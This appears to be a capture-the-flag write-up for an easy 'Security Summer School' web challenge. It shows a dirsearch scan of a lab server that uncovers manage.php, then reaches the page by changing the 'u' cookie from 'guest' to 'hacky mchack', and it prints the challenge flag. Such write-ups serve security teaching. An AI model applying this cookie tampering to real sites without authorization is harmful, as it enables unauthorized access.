---
Name: "Chef hacky mchack"
Category: "Security Summer School"
Difficulty: "Easy"
Description: "Combining session analysis and input manipulation to solve the challenge."
---

# Chef hacky mchack
We see a cookie named "u" with the value "guest"

Using dirsearch we find ./manage.php
```bash
python3 dirsearch.py -u http://141.85.224.101:30015/

[20:08:36] Scanning: 
[20:08:45] 301 -   326B - /assets  ->  http://141.85.224.101:30015/assets/
[20:08:45] 403 -   282B - /assets/
[20:08:51] 200 -   16KB - /index.php
[20:08:51] 200 -   16KB - /index.php/login/
[20:08:52] 200 -     0B - /manage.php
[20:08:56] 403 -   282B - /server-status
[20:08:56] 403 -   282B - /server-status/
```

Accessing manage.php with the cookie set to "hacky mchack" reveals the flag

```txt
SSS{n0_m0r3_c00ki3s_f0r_y0u_m1st3r}
```


